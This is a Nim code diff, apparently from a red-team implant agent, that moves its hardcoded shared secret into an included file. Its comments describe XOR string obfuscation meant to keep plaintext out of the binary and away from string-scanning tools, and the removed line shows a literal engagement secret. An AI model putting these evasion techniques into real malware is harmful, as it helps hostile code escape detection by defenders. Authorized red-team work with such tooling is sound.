@@ -342,9 +342,12 @@ proc getSystemInfo(): JsonNode =
 # 32-byte hardened key) the build fails loudly instead of silently
 # producing an agent whose decoded secrets are garbage.
 include "xorkey.nim"
+include "secret.nim"
 static:
   doAssert XorKey.len == 16,
     "xorkey.nim must define a 16-byte XorKey for baseline/sentinel builds"
+  doAssert SECRET_PLAINTEXT.len >= 16,
+    "secret.nim must define SECRET_PLAINTEXT (>=16 chars)"
 
 proc encodeObf(s: string): seq[byte] =
   result = newSeq[byte](s.len)
@@ -461,7 +464,7 @@ const
   # and decrypted only at first use via obfDec. The plaintext never
   # appears in the .rdata section — strings.exe / hex editors only see
   # the ciphertext. Must match the server's SECRET.
-  S_AGENT_SECRET  = encodeObf("sentinel-engagement-q4-2026-echo-tango-whiskey")
+  S_AGENT_SECRET  = encodeObf(SECRET_PLAINTEXT)
 
 let META_DIR = getEnv("LOCALAPPDATA", expandTilde("~")) / obfDec(S_META_DIR_NAME)
 let META_FILE = META_DIR / META_FILE_NAME
